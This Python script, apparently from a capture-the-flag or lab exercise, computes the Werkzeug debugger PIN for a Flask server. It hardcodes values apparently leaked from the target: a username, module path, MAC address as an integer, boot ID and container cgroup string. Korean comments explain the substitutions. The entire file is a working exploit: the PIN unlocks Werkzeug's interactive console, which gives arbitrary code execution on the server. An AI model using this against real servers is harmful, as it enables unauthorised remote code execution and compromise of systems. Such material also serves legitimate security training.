# secret = OIPB4QhiqcR2ZPIBM3ZJ
# MAC= aa:fc:00:00:25:01
#    = 187999308489985
# boot-id= 77a656e2-a438-4fdd-ac0a-81054b97a1c6
# cgroup = libpod-afbff612154d0c701b36e5f43af8be27f3dc7e88b2d26a1a0c56b1992179a009

import getpass
import hashlib
import os
import sys
import typing as t
from contextlib import ExitStack
from contextlib import nullcontext
from io import BytesIO
from itertools import chain
from os.path import basename
from os.path import join
from zlib import adler32


def get_pin_and_cookie_name(app):

    pin = os.environ.get("WERKZEUG_DEBUG_PIN")
    rv = None
    num = None

    if pin == "off":
        return None, None

    if pin is not None and pin.replace("-", "").isdecimal():
        # If there are separators in the pin, return it directly
        if "-" in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, "__module__", t.cast(
        object, app).__class__.__module__)
    username: t.Optional[str]

    try:
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    probably_public_bits = [
        'root',  # username
        'flask.app',  # modname 고정
        # getattr(app, '__name__', getattr(app.__class__, '__name__')) 고정
        'Flask',
        # getattr(mod, '__file__', None),
        '/usr/local/lib/python3.8/site-packages/flask/app.py'
    ]

    private_bits = [
        "187999308489985",
        b"77a656e2-a438-4fdd-ac0a-81054b97a1c6libpod-afbff612154d0c701b36e5f43af8be27f3dc7e88b2d26a1a0c56b1992179a009"
    ]


# Mac 주소를 Int로 변환해주는 사이트
# https://www.vultr.com/resources/mac-converter/?mac_address=aa%3Afc%3A00%3A00%3A2b%3A01

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x: x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num
    print(rv)
    return rv, cookie_name


get_pin_and_cookie_name("test")
